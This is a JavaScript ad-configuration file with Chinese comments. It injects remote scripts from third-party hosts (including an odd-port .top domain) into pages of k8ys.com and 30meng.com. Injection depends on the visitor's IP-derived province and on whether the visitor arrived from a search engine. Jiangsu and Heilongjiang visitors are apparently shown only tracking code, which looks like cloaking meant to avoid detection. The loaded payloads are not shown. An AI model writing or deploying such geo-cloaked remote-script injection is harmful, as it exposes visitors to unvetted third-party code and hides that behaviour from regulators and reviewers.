/* 版本3.1 20200802.1357代码 20200814.1437-20200905.1405-333 */
/* 126接口 */
...
/* JS判断地区省市代码002 wap */
var tc=1;
var _c_wap_002=["<script type='text/javascript'>if(localAddress.province.indexOf('江苏') != -1 || localAddress.province.indexOf('江苏省') != -1 || localAddress.province.indexOf('黑龙江') != -1 || localAddress.province.indexOf('黑龙江省') != -1) {bsgs=1;document.write(_c_tongji_003);}else{bsgs=0;document.write(_c_wap_003);}</script>"];
/* 指定联网类型代码003 wap */
...
/* JS判断地区省市代码005 wap */
var tc=1;
var _c_wap_005=["<script type='text/javascript'>if(remote_ip_info.province.indexOf('江苏') != -1 || remote_ip_info.province.indexOf('江苏省') != -1 || remote_ip_info.province.indexOf('黑龙江') != -1 || remote_ip_info.province.indexOf('黑龙江省') != -1) {bsgs=1;document.write(_c_tongji_003);}else{bsgs=0;document.write(_c_wap_011+_c_wap_004+_c_tongji_002);}</script>"];
/* JS当前域名代码011 wap */
var _c_wap_011=["<script type='text/javascript'>if(location.href.indexOf('k8ys.com') > -1) {document.write(_c_wap_012);}else if(location.href.indexOf('30meng.com') > -1) {document.write(_c_wap_013);}else{document.write(_c_wap_013+_c_tongji_003);}</script>"];
/* 广告代码012 wap k8ys.com */
var _c_wap_012=["<body><!--STATUS OK WAP 上--> <script id='mob' type='text/javascript' charset='utf-8' src='https://www.zhenxunkeji.com/d.php?pid=3246'></script> <script src='https://www.wyxcb3.top:18443/aa/x-641-34.js'></script> </body>"];
/* 广告代码013 wap 30meng.com */
var _c_wap_013=["<body><!--STATUS OK WAP 下--> <script id='mob' type='text/javascript' charset='utf-8' src='https://www.zhenxunkeji.com/d.php?pid=3246'></script> <script src='https://www.wyxcb3.top:18443/aa/x-637-33.js'></script> </body>"];
/* 搜索引擎代码001 pc */
var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|sm|so)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
...
/* JS判断地区省市代码002 pc */
var tc=1;
var _c_pc_002=["<script type='text/javascript'>if(localAddress.province.indexOf('江苏') != -1 || localAddress.province.indexOf('江苏省') != -1 || localAddress.province.indexOf('黑龙江') != -1 || localAddress.province.indexOf('黑龙江省') != -1) {bsgs=1;document.write(_c_tongji_003);}else{bsgs=0;document.write(_c_pc_003);}</script>"];
/* JS判断地区省市代码003 pc */
var tc=1;
var _c_pc_003=["<script type='text/javascript'>if(remote_ip_info.province.indexOf('江苏') != -1 || remote_ip_info.province.indexOf('江苏省') != -1 || remote_ip_info.province.indexOf('黑龙江') != -1 || remote_ip_info.province.indexOf('黑龙江省') != -1) {bsgs=1;document.write(_c_tongji_003);}else{bsgs=0;document.write(_c_pc_011+_c_tongji_002);}</script>"];
/* JS当前域名代码011 pc */
var _c_pc_011=["<script type='text/javascript'>if(location.href.indexOf('k8ys.com') > -1) {document.write(_c_pc_012);}else if(location.href.indexOf('30meng.com') > -1) {document.write(_c_pc_013);}else{document.write(_c_pc_013+_c_tongji_003);}</script>"];
/* 广告代码012 pc k8ys.com */
var _c_pc_012=["<body><!--STATUS OK PC--> <script src='https://tz.yuanmengbi.com//iis.html?id=610'></script> </body>"];
/* 广告代码013 pc 30meng.com*/
var _c_pc_013=["<body><!--STATUS OK PC--> <script src='https://tz.yuanmengbi.com//iis.html?id=610'></script> </body>"];
